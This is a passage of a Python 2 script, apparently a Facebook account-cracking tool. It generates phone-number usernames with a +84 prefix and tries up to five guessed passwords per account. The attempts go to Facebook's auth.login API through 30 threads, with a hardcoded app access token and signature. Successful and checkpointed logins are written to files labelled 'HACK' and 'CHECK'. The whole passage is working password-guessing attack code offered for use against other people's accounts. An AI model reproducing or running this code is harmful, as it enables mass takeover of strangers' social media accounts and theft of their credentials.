                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/india.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/india.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack done ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;92m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/bangla1.txt'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 contoh.py')


def nguyen():
    os.system('clear')
    print logo2
    print '\x1b[1;92m   357 - 175 - 037 - 918'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;92m ')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;96m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+84'
        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m Example : \x1b[1;92m Nguyen123'
        pass1 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] Password 1 : \x1b[92m')
        pass2 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;90mPassword 2 : \x1b[92m')
        pass3 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] Password 3 : \x1b[92m')
        pass4 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;90mPassword 4 : \x1b[92m')
        pass5 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] Password 5 : \x1b[92m')
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mDon't Close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/nguyen.txt', 'a')
                okb.write('[HACK] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/nguyen.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/nguyen.txt', 'a')
                    okb.write('[HACK] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/nguyen.txt', 'a')
                    cps.write('[CHECK] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/nguyen.txt', 'a')
                        okb.write('[HACK] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/nguyen.txt', 'a')
                        cps.write('[CHECK]' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass4
                            okb = open('save/nguyen.txt', 'a')
                            okb.write('[HACK]' + k + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass4
                            cps = open('save/nguyen.txt', 'a')
                            cps.write('[CHECK' + k + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass5
                                okb = open('save/nguyen.txt', 'a')
                                okb.write('[HACK]' + k + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass5
                                cps = open('save/nguyen.txt', 'a')
                                cps.write('[CHECK]' + k + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/nguyen.txt'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 contoh.py')


if __name__ == '__main__':
    menu()